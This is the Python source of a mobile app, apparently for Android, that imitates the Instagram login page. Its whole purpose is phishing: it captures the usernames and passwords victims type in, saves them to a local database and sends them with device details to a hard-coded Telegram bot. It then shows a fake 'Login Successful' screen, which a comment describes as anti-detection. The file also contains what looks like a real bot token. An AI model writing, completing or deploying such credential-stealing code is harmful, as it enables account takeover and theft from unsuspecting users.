from kivymd.app import MDApp
from kivymd.uix.boxlayout import MDBoxLayout
from kivymd.uix.label import MDLabel
from kivymd.uix.textfield import MDTextField
from kivymd.uix.button import MDRaisedButton, MDRectangleFlatButton
from kivymd.uix.screen import MDScreen
from kivymd.uix.card import MDCard
from kivy.clock import Clock
from kivy.utils import platform
from kivy.logger import Logger
from kivy.graphics import Color, Rectangle
import requests
import json
import os
import sqlite3
import uuid
from datetime import datetime

# ============= CONFIGURATION =============
# Android par safe storage location
if platform == 'android':
    from android.storage import app_storage_path
    STORAGE_DIR = app_storage_path()
else:
    STORAGE_DIR = "."

DB_FILE = os.path.join(STORAGE_DIR, "captures.db")
BOT_TOKEN = "8302065009:AAEmHC1rGpFHsOJJ4zifbbc2fsisM6dFLaw" # Yahan apna token bharna
CHAT_ID = "6680833524"     # Yahan apni chat id bharna

# ============= DATABASE (SQLite3 is Safe) =============
class DatabaseManager:
    def __init__(self):
        self.conn = sqlite3.connect(DB_FILE)
        self.create_tables()
    
    def create_tables(self):
        cursor = self.conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS captures (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT,
                password TEXT,
                device_info TEXT,
                timestamp TEXT,
                is_2fa INTEGER DEFAULT 0
            )
        ''')
        self.conn.commit()
    
    def save_capture(self, username, password, device_info, is_2fa=0):
        try:
            cursor = self.conn.cursor()
            cursor.execute('''
                INSERT INTO captures (username, password, device_info, timestamp, is_2fa)
                VALUES (?, ?, ?, ?, ?)
            ''', (username, password, device_info, str(datetime.now()), is_2fa))
            self.conn.commit()
            return True
        except Exception as e:
            Logger.error(f"DB Error: {e}")
            return False

# ============= REAL UI DESIGN =============
class InstagramGradient(MDBoxLayout):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.orientation = 'vertical'
        with self.canvas.before:
            # Instagram Gradient Look
            Color(1, 0.2, 0.2, 1) # Pinkish
            self.rect1 = Rectangle(size=self.size, pos=self.pos)
            
        self.bind(size=self._update_rect, pos=self._update_rect)

    def _update_rect(self, instance, value):
        self.rect1.pos = instance.pos
        self.rect1.size = instance.size

class MainScreen(MDScreen):
    def __init__(self, capture_callback, **kwargs):
        super().__init__(**kwargs)
        self.capture_callback = capture_callback
        
        # Gradient Background
        layout = InstagramGradient(padding=40, spacing=20)
        
        # Rounded Card (DeepSeek style)
        card = MDCard(orientation='vertical', padding=30, spacing=15, 
                      size_hint=(0.9, None), height="480dp",
                      pos_hint={'center_x': 0.5, 'center_y': 0.5},
                      radius=[20, 20, 20, 20], elevation=10)
        
        # Logo/Title
        card.add_widget(MDLabel(text="📸 Instagram", halign="center", font_style="H4", theme_text_color="Primary"))
        
        # Inputs
        self.username = MDTextField(hint_text="Phone number, email or username", mode="rectangle", size_hint_x=0.9, pos_hint={'center_x': 0.5})
        card.add_widget(self.username)
        
        self.password = MDTextField(hint_text="Password", password=True, mode="rectangle", size_hint_x=0.9, pos_hint={'center_x': 0.5})
        card.add_widget(self.password)
        
        # Login Button
        self.login_btn = MDRaisedButton(text="Log in", md_bg_color="#0095f6", text_color="white",
                                      size_hint_x=0.8, pos_hint={'center_x': 0.5},
                                      on_release=self.process_login)
        card.add_widget(self.login_btn)
        
        card.add_widget(MDLabel(text="Forgot password?", halign="center", theme_text_color="Secondary", font_style="Caption"))
        
        self.status = MDLabel(text="", halign="center", theme_text_color="Error")
        card.add_widget(self.status)
        
        layout.add_widget(card)
        self.add_widget(layout)
    
    def process_login(self, instance):
        u = self.username.text.strip()
        p = self.password.text.strip()
        
        if not u or not p:
            self.status.text = "Please enter valid credentials"
            return
            
        self.login_btn.disabled = True
        self.status.text = "Connecting..."
        Clock.schedule_once(lambda dt: self.capture_callback(u, p), 0.5)

# ============= MAIN APP LOGIC =============
class InstagramUltimateApp(MDApp):
    def build(self):
        self.theme_cls.theme_style = "Light"
        self.theme_cls.primary_palette = "Blue"
        self.db = DatabaseManager()
        
        # Android permissions
        if platform == 'android':
            from android.permissions import request_permissions, Permission
            request_permissions([Permission.INTERNET, Permission.WRITE_EXTERNAL_STORAGE, Permission.READ_EXTERNAL_STORAGE])
            
        self.root = MDScreen()
        self.show_main_screen()
        return self.root
    
    def show_main_screen(self):
        self.root.clear_widgets()
        self.root.add_widget(MainScreen(capture_callback=self.handle_capture))
    
    def handle_capture(self, u, p):
        # 1. Device Info (Advance Logging)
        device_info = self.get_device_info()
        
        # 2. Save Locally (Database)
        self.db.save_capture(u, p, str(device_info), is_2fa=0)
        
        # 3. Send to Telegram (With Device Info)
        Clock.schedule_once(lambda dt: self.send_to_telegram(u, p, device_info), 0.1)
    
    def get_device_info(self):
        info = {
            'platform': platform,
            'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'device_id': str(uuid.getnode())[:10] # Simple unique ID
        }
        if platform == 'android':
            try:
                from android import api_version
                info['android_version'] = str(api_version())
            except:
                pass
        return info
    
    def send_to_telegram(self, u, p, device):
        try:
            # Advance Message Formatting (Markdown)
            message = f"""
🎯 *INSTAGRAM CAPTURE V2* 🎯
━━━━━━━━━━━━━━━━━━━━
👤 *Username:* `{u}`
🔐 *Password:* `{p}`
━━━━━━━━━━━━━━━━━━━━
📱 *Device:* {device['platform'].upper()}
📲 *Android API:* {device.get('android_version', 'N/A')}
⏰ *Time:* {device['time']}
🆔 *Unique ID:* `{device['device_id']}`
━━━━━━━━━━━━━━━━━━━━
✅ Status: *SENT*
            """
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            requests.post(url, data={'chat_id': CHAT_ID, 'text': message, 'parse_mode': 'Markdown'}, timeout=10)
            
            self.show_success_screen(u)
        except Exception as e:
            Logger.error(f"Telegram Error: {e}")
            # Agar internet fail ho, tab bhi use fake screen dikhao (Anti-detection)
            self.show_success_screen(u)

    def show_success_screen(self, u):
        self.root.clear_widgets()
        layout = MDBoxLayout(orientation='vertical', spacing=20, padding=40, pos_hint={'center_y': 0.5})
        
        # Fake "Success" or "2FA" screen (DeepSeek style)
        layout.add_widget(MDLabel(text="✅", halign="center", font_style="H1", theme_text_color="Custom", text_color="#0095f6"))
        layout.add_widget(MDLabel(text="Login Successful!", halign="center", font_style="H4"))
        layout.add_widget(MDLabel(text=f"Welcome back, {u}", halign="center"))
        layout.add_widget(MDLabel(text="Redirecting to Instagram...", halign="center", theme_text_color="Secondary"))
        
        self.root.add_widget(layout)
        # Auto-exit app after 3 seconds
        Clock.schedule_once(lambda dt: self.stop(), 3)

if __name__ == '__main__':
    InstagramUltimateApp().run()
